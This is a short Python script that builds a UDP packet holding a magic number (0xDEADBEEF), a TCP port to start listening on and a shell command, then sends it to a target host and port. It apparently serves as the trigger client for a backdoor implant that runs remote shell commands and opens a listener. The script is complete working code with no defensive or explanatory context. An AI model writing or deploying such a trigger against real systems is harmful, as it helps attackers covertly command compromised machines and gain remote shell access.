import socket
import struct

def send_udp_packet(dest_host, dest_port, magic, port_number, shell_command):

    # Ensure the shell_command is not longer than 255 characters
    if len(shell_command) > 255:
        raise ValueError("Shell command must be 255 characters or less")

    # Pad the shell_command to 256 characters with null bytes
    shell_command_padded = shell_command.ljust(256, '\x00')

    # Pack the data into the specified format
    packet_format = '!IH256s'  # Network byte order: uint32_t, uint16_t, char[256]
    packet = struct.pack(packet_format, magic, port_number, shell_command_padded.encode())

    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Send the packet
    sock.sendto(packet, (dest_host, dest_port))

    # Close the socket
    sock.close()

if __name__ == "__main__":
    dest_host = "127.0.0.1"  # sendto IP address
    dest_port = 553  # sendto UDP port
    magic = 0xDEADBEEF  # Magic number
    port_number = 2226  # TCP port number to start listening on
    shell_command = "ls" # command
    send_udp_packet(dest_host, dest_port, magic, port_number, shell_command)
    print("UDP packet sent.")
